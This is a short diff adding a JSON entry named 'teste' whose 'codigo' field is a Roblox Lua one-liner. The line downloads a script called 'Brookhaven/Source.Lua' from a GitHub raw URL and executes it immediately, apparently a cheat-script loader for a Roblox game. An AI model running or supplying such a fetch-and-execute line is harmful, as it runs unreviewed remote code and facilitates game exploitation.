@@ -1,1 +1,7 @@
-[]
+[
+  {
+    "nome": "teste",
+    "descricao": "sem na da",
+    "codigo": "loadstring(game:HttpGet(('https://raw.githubusercontent.com/realgengar/Brookhaven/refs/heads/main/Source.Lua'),true))()"
+  }
+]
